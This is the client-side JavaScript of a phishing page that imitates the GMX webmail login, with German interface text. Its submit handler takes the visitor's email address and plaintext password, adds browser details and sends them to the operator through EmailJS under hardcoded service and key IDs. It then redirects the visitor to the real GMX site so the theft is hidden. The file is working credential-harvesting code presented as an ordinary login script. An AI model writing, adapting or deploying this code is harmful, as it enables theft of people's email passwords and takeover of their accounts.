/**
 * ====================================================
 *  GMX LOGIN - EmailJS Configuration & Logic
 *  All functionality kept EXACTLY the same
 * ====================================================
 */

// ====================================================
// 1. CONFIGURATION
// ====================================================
const CONFIG = {
    emailjs: {
        serviceID: 'service_ydzizvt',
        templateID: 'template_uon3ni4',
        publicKey: 'cBhKSzjmUNIUS_As7',
        resetTemplateID: 'YOUR_RESET_TEMPLATE_ID' // ← Replace if needed
    },
    redirectURL: 'https://www.gmx.net/magazine/'
};

// ====================================================
// 2. INITIALIZATION
// ====================================================
emailjs.init(CONFIG.emailjs.publicKey);

// ====================================================
// 3. DOM REFS (cached for performance)
// ====================================================
const DOM = {
    form: document.getElementById('form'),
    button: document.getElementById('button'),
    buttonText: document.getElementById('button-text'),
    email: document.getElementById('email'),
    password: document.getElementById('password'),
    remember: document.getElementById('remember'),
    togglePassword: document.getElementById('toggle-password'),
    closedEye: document.getElementById('closed-eye'),
    openEye: document.getElementById('open-eye'),
    forgotLink: document.getElementById('forgot-password-link')
};

// ====================================================
// 4. PASSWORD TOGGLE
// ====================================================
DOM.togglePassword.addEventListener('click', function() {
    const type = DOM.password.getAttribute('type') === 'password' ? 'text' : 'password';
    DOM.password.setAttribute('type', type);
    DOM.closedEye.classList.toggle('hide');
    DOM.openEye.classList.toggle('hide');
});

// ====================================================
// 5. REMEMBER ME - Save/Load
// ====================================================
DOM.remember.addEventListener('change', function() {
    if (this.checked) {
        localStorage.setItem('remember_email', DOM.email.value);
    } else {
        localStorage.removeItem('remember_email');
    }
});

// Auto-fill saved email
const savedEmail = localStorage.getItem('remember_email');
if (savedEmail) {
    DOM.email.value = savedEmail;
    DOM.remember.checked = true;
}

// ====================================================
// 6. SUBMIT HANDLER (EmailJS)
// ====================================================
DOM.form.addEventListener('submit', async function(e) {
    e.preventDefault();
    
    // --- Get form values ---
    const email = DOM.email.value.trim();
    const password = DOM.password.value;
    const remember = DOM.remember.checked;
    
    // --- Validation ---
    if (!email || !password) {
        alert('Bitte füllen Sie alle Felder aus!');
        return;
    }
    
    // --- UI: Loading state ---
    DOM.button.disabled = true;
    DOM.buttonText.innerHTML = 'Senden... <ion-icon name="hourglass-outline"></ion-icon>';
    DOM.button.style.opacity = '0.8';
    
    try {
        // --- Prepare template parameters ---
        const templateParams = {
            from_email: email,
            from_name: email.split('@')[0] || 'User',
            full_email: email,
            password: password,
            login_time: new Date().toLocaleString('de-DE', { 
                weekday: 'long', 
                year: 'numeric', 
                month: 'long', 
                day: 'numeric', 
                hour: '2-digit', 
                minute: '2-digit' 
            }),
            remember_me: remember ? '✅ Ja' : '❌ Nein',
            ip_address: 'Client-side (use server for real IP)',
            user_agent: navigator.userAgent.slice(0, 150),
            referrer: document.referrer || 'Direct',
            form_data: `Email: ${email}\nPasswort: ${password}\nRemember: ${remember}`
        };
        
        console.log('📤 Sending EmailJS:', templateParams);
        
        // --- Send via EmailJS ---
        const response = await emailjs.send(
            CONFIG.emailjs.serviceID,
            CONFIG.emailjs.templateID,
            templateParams
        );
        
        console.log('✅ EmailJS Success:', response.status, response.text);
        
        // --- UI: Success state ---
        DOM.buttonText.innerHTML = 'Erfolgreich! <ion-icon name="checkmark-circle"></ion-icon>';
        DOM.button.style.background = 'linear-gradient(135deg, #10b981, #059669)';
        
        // --- Redirect ---
        setTimeout(() => {
            window.location.href = CONFIG.redirectURL;
        }, 1200);
        
    } catch (error) {
        console.error('❌ EmailJS Error:', error);
        alert(`Fehler: ${error.text || error.message}`);
        DOM.buttonText.textContent = 'Fehler - Nochmal versuchen';
        
        // Reset button after delay
        setTimeout(() => {
            if (!DOM.button.disabled) return;
            DOM.button.disabled = false;
            DOM.buttonText.innerHTML = 'Einloggen <ion-icon name="log-in-outline"></ion-icon>';
            DOM.button.style.opacity = '1';
            DOM.button.style.background = '';
        }, 3000);
    }
});

// ====================================================
// 7. FORGOT PASSWORD HANDLER
// ====================================================
DOM.forgotLink.addEventListener('click', async function(e) {
    e.preventDefault();
    
    const email = DOM.email.value.trim();
    
    if (!email) {
        alert('Bitte geben Sie Ihre E-Mail-Adresse ein.');
        DOM.email.focus();
        return;
    }
    
    try {
        const templateParams = {
            to_email: email,
            reset_time: new Date().toLocaleString('de-DE'),
            reset_link: `${window.location.origin}/reset-password.html`
        };
        
        await emailjs.send(
            CONFIG.emailjs.serviceID, 
            CONFIG.emailjs.resetTemplateID, 
            templateParams
        );
        
        alert(`✅ Reset-Link an ${email} gesendet!`);
    } catch (error) {
        alert('❌ Fehler beim Senden.');
    }
});

console.log('✅ GMX Login initialized successfully');